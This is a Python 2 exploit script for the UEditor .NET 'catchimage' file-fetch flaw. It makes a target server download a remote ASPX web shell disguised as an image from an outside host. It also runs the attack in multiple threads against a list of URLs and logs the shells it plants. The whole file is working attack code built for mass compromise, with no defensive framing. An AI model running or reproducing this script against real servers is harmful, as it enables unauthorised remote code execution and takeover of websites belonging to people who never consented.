#coding:utf-8
#Author:LSA
#Description: ueditor .net getshell(controller.ashx-catchimg)
#Date:20180826

import requests
import optparse
import os
import datetime
import Queue
import threading
import sys
import simplejson

reload(sys) 
sys.setdefaultencoding('utf-8')

lock = threading.Lock()

q0 = Queue.Queue()
threadList = []
global succ
succ = 0
headers = {}
headers["User-Agent"] = 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11'

remoteShell = 'http://www.domain.top/x.jpg?.aspx'

data = {'source[]': remoteShell}

def ue_getshell(tgtUrl,timeout):

	fullUrl = tgtUrl + '?action=catchimage'
	
	try:
		rst = requests.post(fullUrl,headers=headers,data=data,timeout=timeout)
	except requests.exceptions.Timeout:
		print 'Getshell failed! Error: Timeout'
		exit()
	except:
		print 'Getshell failed! Error: Unkonwn error'
		exit()
		
	if rst.status_code == 200:
		try:
			if rst.json()['state'] == 'SUCCESS':
				#print rst.json()["list"][0]['state']
				if rst.json()["list"][0]['state'] == 'SUCCESS':
					print 'Getshell! Shell: ' + rst.json()["list"][0]['url']
				else:
					print 'Getshell failed! Error: ' + rst.json()["list"][0]['state']

			else:
				print 'Getshell failed! Error: ' + rst.json()['state']
		except simplejson.errors.JSONDecodeError:
			print 'Getshell failed! Error: JSONDecodeError'
			exit()
		except:
			print 'Getshell failed! Error: Unkonwn error'
			exit()
	else:
		print 'Getshell failed! status code: ' + str(rst.status_code)

def ue_getshell_batch(timeout,f4success,f4fail):
	global countLines
	while(not q0.empty()):
		fullUrl = q0.get()
		#print fullUrl
		qcount = q0.qsize()
		print 'Checking: ' + fullUrl + '---[' +  str(countLines - qcount) + '/' + str(countLines) + ']'
		
		try:
			rst = requests.post(fullUrl,headers=headers,data=data,timeout=timeout)

		except requests.exceptions.Timeout:
			#print 'Getshell failed! Error: Timeout'
			lock.acquire()
			f4fail.write(fullUrl+': '+'Getshell failed! Error: Timeout'+'\n')
			lock.release()	
			continue
		except:
			#print 'Getshell failed! Error: Unkonwn error'
			lock.acquire()
			f4fail.write(fullUrl+': '+'Getshell failed! Error: Unknown error'+'\n')
			lock.release()	
			continue

		if rst.status_code == 200:
			try:
				if rst.json()['state'] == 'SUCCESS':

					#print rst.json()["list"][0]['state']
					if rst.json()["list"][0]['state'] == 'SUCCESS':
						shellAddr = rst.json()["list"][0]['url']
						print 'Getshell! Shell: ' + shellAddr + '(' + fullUrl + ')'
						lock.acquire()
						f4success.write(fullUrl+': shell: ' + shellAddr + '\n')
						lock.release()
						global succ
						succ = succ + 1
					else:
						errorState = rst.json()["list"][0]['state']
				
						#print 'Getshell failed! Error: ' + errorState
						lock.acquire()
						f4fail.write(fullUrl+': '+errorState+'\n')
						lock.release()
				else:
				
					errorState = rst.json()['state']
				
					#print 'Getshell failed! Error: ' + errorState
					lock.acquire()
					f4fail.write(fullUrl+': '+errorState+'\n')
					lock.release()
			except simplejson.errors.JSONDecodeError:
				#print 'Getshell failed! Error: JSONDecodeError'
				lock.acquire()
				f4fail.write(fullUrl+': '+'Getshell failed! Error: JSONDecodeError'+'\n')
				lock.release()
				continue
			except:
				#print 'Getshell failed! Error: Unkonwn error'
				lock.acquire()
				f4fail.write(fullUrl+': '+'Getshell failed! Error: Unknown error'+'\n')
				lock.release()	
				continue			


		else:
			#print 'Getshell failed! status code: ' + str(rst.status_code)
			lock.acquire()
			f4fail.write(fullUrl+': '+str(rst.status_code)+'\n')
			lock.release()

	 


if __name__ == '__main__':

	print '''
		****************************************************
		*  ueditor .Net getshell(controller.ashx-catchimg) *
		*				      Coded by LSA *
		****************************************************
		'''
	
	parser = optparse.OptionParser('python %prog ' +'-h (manual)',version='%prog v1.0')
	parser.add_option('-u', dest='tgtUrl', type='string', help='single url')

	parser.add_option('-f', dest='tgtUrlsPath', type ='string', help='urls filepath')
	
	parser.add_option('-s', dest='timeout', type='int', default=7, help='timeout(seconds)')
	
	parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')
	(options, args) = parser.parse_args()
	
	
	timeout = options.timeout
	
	tgtUrl = options.tgtUrl

	if tgtUrl:
		ue_getshell(tgtUrl,timeout)
	
	
	
	if options.tgtUrlsPath:
		tgtFilePath = options.tgtUrlsPath
		threads = options.threads
		nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
		os.mkdir('batch_result/'+str(nowtime))
		f4success = open('batch_result/'+str(nowtime)+'/'+'success.txt','w')
		f4fail = open('batch_result/'+str(nowtime)+'/'+'fail.txt','w')
		urlsFile = open(tgtFilePath)
		global countLines
		countLines = len(open(tgtFilePath,'rU').readlines())

		print '===Total ' + str(countLines) + ' urls==='

		for urls in urlsFile:
			fullUrls = urls.strip() + '?action=catchimage'
			q0.put(fullUrls)
		for thread in range(threads):
			t = threading.Thread(target=ue_getshell_batch,args=(timeout,f4success,f4fail))
			t.start()
			threadList.append(t)
		for th in threadList:
			th.join()


		print '\n###Finished! [success/total]: ' + '[' + str(succ) + '/' + str(countLines) + ']###'
		print 'Results were saved in ./batch_result/' + str(nowtime) + '/'
		f4success.close()
		f4fail.close()

	
	


